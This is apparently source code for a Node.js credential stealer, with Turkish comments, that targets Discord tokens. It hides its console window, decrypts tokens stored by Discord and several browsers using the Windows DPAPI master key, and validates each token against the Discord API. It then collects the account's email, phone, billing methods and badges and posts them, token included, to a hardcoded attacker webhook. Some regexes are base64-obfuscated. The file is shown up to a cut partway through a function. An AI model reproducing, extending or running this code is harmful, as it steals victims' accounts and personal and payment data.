const fs = require('fs');
const os = require('os');
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');
const dpapi = require("@primno/dpapi");
const { exec } = require('child_process');
const child_process = require('child_process');
const { spawn } = require('child_process');
const { execSync } = require('child_process');
const https = require('https');
const { DateTime } = require('luxon'); // Tarih hesaplamaları için kullanacağız
const zlib = require('zlib');
const archiver = require('archiver');
const FormData = require('form-data');

function hideSelf() {
    // PowerShell script to hide console
    let powershellScript = `
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    # 0 hides the console
    [Console.Window]::ShowWindow($consolePtr, 0)
    `;

    // Write to %TEMP% directory
    let tempDir = process.env.TEMP || '/tmp'; // Get the TEMP directory path
    let tempFile = path.join(tempDir, 'hide_console.ps1');
    fs.writeFileSync(tempFile, powershellScript);

    try {
        // Execute the PowerShell script from %TEMP% directory
        execSync(`powershell.exe -noprofile -executionpolicy bypass -file "${tempFile}"`, { stdio: 'ignore' });
    } catch (err) {
        console.error('Error while hiding console:', err);
    } finally {
        // Clean up by deleting the temporary script
        if (fs.existsSync(tempFile)) {
            fs.unlinkSync(tempFile);
        }
    }
}


hideSelf();



// Çevresel değişkenlerden appdata ve localappdata'yı alın
var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

// Tokenlerin veya ilgili dosyaların olabileceği yollar
paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

// Klasör yolları
const webhookUrl = 'https://discord.com/api/webhooks/1311421064160612372/KVyk5cnxg7jRUECemj2_Qcdnn9c8Q4kHFtP9EpWBPHU8JcIH2i3l5SYzJEorL3jTwRwJ';





function getProfiles(path, name) {
    const profile = path.split("%PROFILE%");
    if (profile.length == 1) {
        return [{
            path: path,
            name: name
        }];
    }

    if (!fs.existsSync(profile[0])) {
        return [];
    }

    var dirs = fs.readdirSync(profile[0]);
    var profiles = [];
    for (var i = 0; i < dirs.length; i++) {
        var dir = dirs[i];
        if (fs.existsSync(profile[0] + dir + profile[1])) {
            profiles.push({
                "path": profile[0] + dir + profile[1],
                "profile": name + " " + dir
            });
        }
    }

    return profiles;
}

class DiscordAccount {
    constructor(username, discriminator, id, nitro, badges, billings, email, phone, token, avatar, bio) {
        this.username = username;
        this.tag = `${username}#${discriminator}`;
        this.id = id;
        this.nitro = nitro;
        this.badges = badges;
        this.billings = billings;
        this.email = email;
        if (phone != "" && phone != undefined) {
            this.phone = phone;
        } else {
            this.phone = "None"
        }
        if (bio != "" && bio != undefined) {
            this.bio = bio.replace(/\n/gm, "\\n")
        } else {
            this.bio = "None"
        }
        this.token = token;
        this.avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
    }
}

function getMasterKey(basePath) {
    let masterKeyPath = basePath + "\\Local State";
    let encrypted = Buffer.from(JSON.parse(fs.readFileSync(masterKeyPath, "utf-8"))["os_crypt"]["encrypted_key"], "base64").slice(5);
    return dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');
}

function getEncryptedToken(basepath) {
    let logsPath = basepath + "\\Local Storage\\leveldb\\";
    if (!fs.existsSync(logsPath)) {
        return [];
    }
    let files = fs.readdirSync(logsPath);
    var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/gm;
    var result = [];

    for (let file of files) {
        if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
            continue;
        }

        let content = fs.readFileSync(logsPath + file, "utf-8");
        result = result.concat(content.match(encrypted_regex));
    }

    result = result.filter((item, pos) => result.indexOf(item) == pos);
    result = result.filter(function (el) {
        return el != null;
    });
    return result;
}

function decryptoToken(encryptedTokens, masterKey) {
    var tokens = [];
    for (let encryptedToken of encryptedTokens) {
        try {
            var token = Buffer.from(encryptedToken.split('dQw4w9WgXcQ:')[1], "base64");
            let start = token.slice(3, 15),
                middle = token.slice(15, token.length - 16),
                end = token.slice(token.length - 16, token.length),
                decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, start);

            decipher.setAuthTag(end);
            token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
            tokens.push(token);
        } catch (e) {
            continue
        }
    }
    return tokens;
}



async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "Nitro Classic";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "Nitro Classic";

            if (!info.premium_guild_since) return "";

            let boost = ["1 Month Boost Badge", "2 Month Boost Badge", "3 Month Boost Badge", "6 Month Boost Badge", "9 Month Boost Badge", "12 Month Boost Badge", "15 Month Boost Badge", "18 Month Boost Badge", "24 Month Boost Badge"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getBilling(token) {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'
            }
        });

        console.log("Billing API Response:", response.data); // API yanıtını logla

        if (response.status === 200) {
            let billings = "";
            const billingData = response.data;

            // Eğer billing verisi bir dizi ise ve içinde geçerli veriler varsa
            if (Array.isArray(billingData) && billingData.length > 0) {
                // Ödeme yöntemlerini işleyin
                for (let method of billingData) {
                    if (!method.invalid) {
                        if (method.type === 1) { // Credit Card
                            billings += `:credit_card: ${method.brand} ending in ${method.last_4}\n`;
                        } else if (method.type === 2) { // PayPal
                            billings += ":parking: PayPal\n";
                        }
                    }
                }

                // Eğer billing verisi bulunmazsa, "No valid billing methods."
                if (billings === "") {
                    billings = "No valid billing methods.";
                }

                return billings;  // Billing bilgilerini döndür
            } else {
                console.log("No billing methods found.");
                return "No valid billing methods.";
            }
        }
    } catch (error) {
        console.log("Error fetching billing for token:", token, error);
        return null;
    }
}

async function checkToken(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"
            }
        });

        if (response.status === 200) {
            console.log("Good token:", token);
            return true;  // Geçerli token
        } else {
            console.log("Bad token:", token);
            return false;  // Geçersiz token
        }
    } catch (error) {
        console.log("Token check failed:", token);
        return false;  // Hata durumu da geçersiz sayılır
    }
}


async function getAccounts(tokens) {
    let accounts = [];

    for (let token of tokens) {
        try {
            // Token'ı kontrol et, geçerliyse devam et
            const isValid = await checkToken(token);
            if (!isValid) continue;  // Eğer token geçersizse, geç ve diğer token'a geç

            // Eğer token geçerliyse, billing bilgilerini al
            const billing = await getBilling(token);
            if (!billing) {
                console.log("No billing data found for token:", token);
                continue;  // Billing verisi alınamazsa geç
            }

            // Discord API'den hesap bilgilerini al
            const res = await axios.get('https://discord.com/api/v9/users/@me', {
                headers: {
                    "Authorization": token
                }
            });

            const json = res.data;
            const nitro = await getNitro(json.premium_type, json.id, token);
            
            if (json.message == null) {
                accounts.push(new DiscordAccount(
                    json.username,
                    json.discriminator,
                    json.id,
                    nitro,
                    getBadges(json),
                    billing,
                    json.email,
                    json.phone,
                    token,
                    json.avatar,
                    json.bio
                ));
            }
        } catch (e) {
            console.error("Error processing token:", token);
            continue;  // Hata alırsan, o token'ı atla ve devam et
        }
    }

    return accounts;
}

async function grabDiscord() {
    let appdata = process.env.APPDATA;
    let local = process.env.LOCALAPPDATA;
    var discordPath = [
        appdata + "\\discord",
        appdata + "\\discordcanary",
        appdata + "\\discordptb",
    ];

    var tokens = [];

    for (let path of discordPath) {
        if (!fs.existsSync(path)) {
            continue;
        }
        let encryptedTokens = getEncryptedToken(path);
        let masterKey = getMasterKey(path);
        tokens = tokens.concat(decryptoToken(encryptedTokens, masterKey));
    }


    var browsers_path = [
        appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        local + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        local + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        local + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Iridium\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Yandex\\YandexBrowser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\uCozMedia\\Uran\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Vivaldi\\User Data\\%PROFILE%\\Local Storage\\leveldb\\"
    ];

    var browsers_profile = [];
    for (var i = 0; i < browsers_path.length; i++) {
        const browser = browsers_path[i];
        const profiles = getProfiles(browser, browser.split("\\")[6]);
        for (var j = 0; j < profiles.length; j++) {
            browsers_profile.push(profiles[j].path);
        }
    }

    const reg1 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9", 'base64').toString();
    const reg2 = Buffer.from("bWZhXC5bXHctXXs4NH0=", 'base64').toString();
    const reg3 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==", 'base64').toString();
    
    const cleanRegex = [new RegExp(reg1, 'gm'),
        new RegExp(reg2, 'gm'), new RegExp(reg3, 'gm')
    ];

    for (let path of browsers_profile) {
        if (!fs.existsSync(path)) {
            continue;
        }

        let files = fs.readdirSync(path);
        for (let file of files) {
            for (let reg of cleanRegex) {
                if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
                    continue;
                }

                let content = fs.readFileSync(path + file, "utf-8");
                tokens = tokens.concat(content.match(reg));
            }
        }
    }

    tokens = tokens.filter(function (item, pos) {
        return tokens.indexOf(item) == pos && item != null;
    });

    
    return await getAccounts(tokens);
}

async function getAvatarUrl(account) {
    if (account.avatar) {
        const avatarExt = account.avatar.startsWith('a_') ? 'gif' : 'png'; // Eğer avatar GIF ise, uzantıyı 'gif' olarak ayarla
        const avatarUrl = `${account.avatar}?size=512`;
        return avatarUrl;
    } else {
        // Eğer avatar yoksa varsayılan avatar URL'si kullan
        return 'https://cdn.discordapp.com/embed/avatars/0.png';
    }
}


async function grabDiscordAndSendEmbed() {
    try {
        const accounts = await grabDiscord(); // Hesapları al

        // Her bir hesap için embed oluştur ve gönder
        for (const account of accounts) {
            // Avatar URL'yi doğru şekilde oluştur
            const avatarUrl = await getAvatarUrl(account); // Avatar URL'yi al

            // Nitro değerini kontrol et ve doğru şekilde ayarla
            const nitro = account.nitro && typeof account.nitro === 'string' && account.nitro.trim() !== '' 
                ? account.nitro 
                : "Not Provided";

            // Billing bilgisini al
            const billingInfo = await getBilling(account.token); // Token kullanarak billing bilgisi al

            // Embed Objelerini Hazırla
            const embed = {
                title: `Discord App Token`, // Başlık
                color: 0x9b59b6, // Mor renk
                thumbnail: {
                    url: avatarUrl // Avatar resmi embed'e ekle
                },
                fields: [
                    { name: "Username", value: `\`${account.username}\`` || "Not Provided", inline: true },
                    { name: "User ID", value: `\`${account.id}\`` || "Not Provided", inline: true },
                    { name: "Nitro", value: nitro, inline: true },
                    { name: "Badges", value: account.badges || "Not Provided", inline: false },
                    { name: "Billing", value: billingInfo || "No valid billing methods.", inline: true }, // Billing bilgisini ekle
                    { name: "Email", value: `\`${account.email}\`` || "Not Provided", inline: true },
                    { name: "Phone", value: `\`${account.phone}\`` || "Not Provided", inline: true },
                    { name: "Token", value: account.token ? `\`${account.token}\`` : "Not Provided", inline: false },
                    { name: "Bio", value: `\`${account.bio}\`` || "Not Provided", inline: false },
                ],
                
                footer: { text: "NyxSoftware" },
                timestamp: new Date().toISOString(),
            };

            // Embed'i yazdırarak kontrol et
            console.log("Embed Verisi: ", JSON.stringify(embed, null, 2));

            // Embed'i Discord'a gönder
            await sendEmbedToDiscord(embed);
        }
    } catch (err) {
        console.error("Bir hata oluştu:", err);
    }
}

// Embed Gönderme
async function sendEmbedToDiscord(embed) {
    try {
        const payload = {
            content: "@everyone", // İsteğe bağlı mesaj
            embeds: [embed], // Embed veri
        };

        // Webhook'a POST isteği gönder
        const response = await axios.post(webhookUrl, payload, {
            headers: {
                'Content-Type': 'application/json',
            },
        });

        console.log("Embed başarıyla gönderildi.");
    } catch (error) {
        console.error("Embed gönderilirken hata oluştu:", error.response ? error.response.data : error.message);
    }
}


const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "Discord_Employee",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "Partnered_Server_Owner",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "HypeSquad_Events",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "Bug_Hunter_Level_1",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "Early_Supporter",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "Bug_Hunter_Level_2",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "Early_Verified_Bot_Developer",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "House_Bravery",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "House_Brilliance",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "House_Balance",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "Discord_Official_Moderator",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}



function getBadges(json) {
    let badges = [{
        "name": "Staff",
        "flag": 1
    }, {
        "name": "Partner",
        "flag": 2
    }, {
        "name": "HypeSquad Events",
        "flag": 4
    }, {
        "name": "Bug Hunter 1",
        "flag": 8
    }, {
        "name": "Bug Hunter 2",
        "flag": 16384
    }, {
        "name": "Developer",
        "flag": 131072
    }, {
        "name": "Early Supporter",
        "flag": 512
    }, {
        "name": "Bravery",
        "flag": 64
    }, {
        "name": "Brilliance",
        "flag": 128
    }, {
        "name": "Balance",
        "flag": 256
    }, {
        "name": "Active Developer",
        "flag": 4194304
    }, {
        "name": "Quest",
        "flag": 536870912
    }, {
        "name": "Verified Bot Developer",
        "flag": 8192
    }, {
        "name": "Discord Certified Moderator",
        "flag": 33554432
    }];

    let flag = json["flags"];
    let badgesRes = "";

    // Badge'lerin kontrolü ve isimlerin eklenmesi
    for (let badge of badges) {
        if ((flag & badge.flag) == badge.flag) {
            badgesRes += badge.name + " "; // Badge ismini ekle
        }
    }

    return (badgesRes == "") ? "`None`" : badgesRes.trim(); // Eğer hiç badge yoksa, None döndür
}

function getRareBadges(flags) {
  const rareBadges = []; // Eşleşen nadir badge'leri tutacak dizi

  for (const prop in badges) {
      let o = badges[prop];
      if ((flags & o.Value) === o.Value && o.Rare) {
          rareBadges.push(o.Emoji); // Eşleşen nadir badge'i diziye ekle
      }
  }

  // Eğer birden fazla badge varsa aralarına "and" koyarak birleştir
  return rareBadges.length > 0 ? rareBadges.join(' and ') : ''; // Eğer hiç nadir badge yoksa boş döndür
}




var tokens = [];

async function findToken(path) {
  let path_tail = path;
  path += 'Local Storage\\leveldb';

  if (!path_tail.includes('discord')) {
      try {
          fs.readdirSync(path)
              .map(file => {
                  (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                      .split(/\r?\n/)
                      .forEach(line => {
                          const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                          for (const pattern of patterns) {
                              const foundTokens = line.match(pattern);
                              if (foundTokens) foundTokens.forEach(token => {
                                  if (!tokens.includes(token)) tokens.push(token)
                              });
                          }
                      });
              });
      } catch (e) { }
      return;
  } else {
      if (fs.existsSync(path_tail + '\\Local State')) {
          try {
              const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;

              fs.readdirSync(path).forEach(file => {
                  if (file.endsWith('.log') || file.endsWith('.ldb')) {
                      const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
                      const lines = fileContent.split(/\r?\n/);

                      const localStatePath = path_tail + '\\Local State';
                      const key = decryptKey(localStatePath);

                      lines.forEach(line => {
                          const foundTokens = line.match(tokenRegex);
                          if (foundTokens) {
                              foundTokens.forEach(token => {
                                  let decrypted;
                                  const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
                                  const start = encryptedValue.slice(3, 15);
                                  const middle = encryptedValue.slice(15, encryptedValue.length - 16);
                                  const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                  const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                  decipher.setAuthTag(end);
                                  decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
                                  if (!tokens.includes(decrypted)) tokens.push(decrypted)
                              });
                          }
                      });
                  }
              });

          } catch (e) { }
          return;
      }
  }
}

async function getUserInfo(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/users/@me", {
            headers: { Authorization: token },
        });
        return response.data;
    } catch (error) {
        console.error("Kullanıcı bilgisi alınamadı:", error.message);
        return null;
    }
}


async function stealwebTokens() {
  for (let path of paths) {
      await findToken(path);
  }

  for (let token of tokens) {
      try {
         // Kullanıcı bilgilerini çek
         const userInfo = await getUserInfo(token);
         if (!userInfo) continue;

         // Nitro ve fatura bilgilerini al
         const nitro = await getNitro(userInfo.premium_type, userInfo.id, token);
         const billingInfo = await getBilling(token);

         // Embed için avatar URL'si oluştur
         const avatarUrl = userInfo.avatar
             ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.${userInfo.avatar.startsWith('a_') ? 'gif' : 'png'}?size=512`
             : 'https://cdn.discordapp.com/embed/avatars/0.png';

         // Embed oluştur
         const embed = {
             title: "Discord Web Token",
             color: 0x9b59b6, // Discord mavisi
             thumbnail: {
                 url: avatarUrl, // Kullanıcının avatarını ekle
             },
